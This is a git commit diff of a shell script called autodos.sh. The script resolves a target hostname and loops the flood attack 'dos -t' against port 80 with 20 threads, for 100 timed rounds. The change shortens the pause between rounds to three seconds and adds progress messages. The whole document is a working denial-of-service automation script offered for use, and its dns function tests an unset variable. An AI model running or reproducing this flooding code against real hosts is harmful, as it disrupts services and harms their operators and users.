f7f86f6828baead103f2b353cd0661b6886473e0
Shellz <isdrupter@users.noreply.github.com>
2016-07-09 22:25:54 -0400

    Update autodos.sh

--- autodos.sh
+++ autodos.sh
@@ -10,18 +10,19 @@
 # Sleep for $__ seconds and do it again.
 
 dns(){
-ip=$(nslookup $host |sed -n 5p | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
+nslookup $host |sed -n 5p | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'
 if [[ "$ip" != "" ]] ; then return 0 ; else return 1 ; fi
-echo "$ip"
 }
 
 loop(){
-i=0
-while [[ "$i" -lt "$hits" ]];do 
-export target=$(dns $host)
-dos -t $target 80 20 $intOn # dos <-t/-u> <ip> <port> <threads> <seconds>
+i=$hits
+while [[ "$i" -gt "0" ]];do
+echo "[*] Attacking for $intOn seconds..."
+dos -t $target 80 20 $intOn >/dev/null # dos <-t/-u> <ip> <port> <threads> <seconds>
+echo "[*] Sleeping for $intOff seconds..."
 sleep $intOff
-i=`expr $i + 1`
+i=`expr $i - 1`
+echo "[*] $i rounds to go"
 done
 }
 
@@ -31,4 +32,6 @@ done
 host="$@"
 hits=100
 intOn=300
-intOff=150
+intOff=3
+target=$(dns $host)
+loop $target $hits
